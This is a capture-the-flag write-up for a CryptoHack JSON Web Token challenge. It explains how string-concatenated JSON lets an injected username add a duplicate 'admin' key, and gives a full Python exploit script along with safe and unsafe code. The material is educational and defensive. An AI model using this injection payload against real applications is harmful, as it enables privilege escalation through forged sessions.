# JSON in JSON (40 pts)

**Category:** JSON Web Tokens
**Difficulty:** Medium

---

## Challenge

The server creates sessions by embedding user input directly into a JSON string. Exploit this to gain admin access.

**Endpoints:**
- `/json-in-json/create_session/<username>/` - Create a session
- `/json-in-json/authorise/<token>/` - Authorize with a token

---

## Vulnerability: JSON Injection

The server builds the JWT payload using string concatenation:

```python
json_string = '{"admin": "False", "username": "' + str(username) + '"}'
```

There's no sanitization of the username input. If we inject `"` characters, we can break out of the string and inject arbitrary JSON keys.

---

## Exploit Strategy

Most JSON parsers, when encountering duplicate keys, use the **last value**. If we inject a second `admin` key after the legitimate one:

```json
{"admin": "False", "username": "x", "admin": "True"}
```

The parser will see `admin` as `True`.

---

## Exploit

```python
import urllib.parse
import requests

# Inject to create: {"admin": "False", "username": "x", "admin": "True"}
#                                                      ^^^^^^^^^^^^^^^^^
#                                                      Our injection
malicious_username = 'x", "admin": "True'

# URL encode special characters
encoded = urllib.parse.quote(malicious_username)
url = f"https://web.cryptohack.org/json-in-json/create_session/{encoded}/"

# Get forged token
response = requests.get(url)
token = response.json()['session']

# Authorize with injected admin claim
auth_url = f"https://web.cryptohack.org/json-in-json/authorise/{token}/"
result = requests.get(auth_url)
print(result.json())
```

**Server-side string after injection:**
```python
'{"admin": "False", "username": "x", "admin": "True"}'
#                                    ^^^^^^^^^^^^^^^^ injected!
```

---

## Why This Works

1. **No input sanitization**: Quotes and special characters pass through unchanged
2. **String concatenation**: The dangerous pattern of building JSON from strings
3. **Duplicate key handling**: JSON parsers typically use last-wins semantics

---

## Safe vs Unsafe Code

```python
# UNSAFE - string concatenation
json_string = '{"admin": "False", "username": "' + username + '"}'

# SAFE - use json library
import json
payload = {"admin": False, "username": username}
json_string = json.dumps(payload)
```

The `json.dumps()` function properly escapes special characters:
- `"` becomes `\"`
- `\` becomes `\\`

---

## References

- [OWASP Injection Theory](https://owasp.org/www-community/Injection_Theory)
- JSON specification (RFC 8259) doesn't define duplicate key behavior, leaving it implementation-dependent
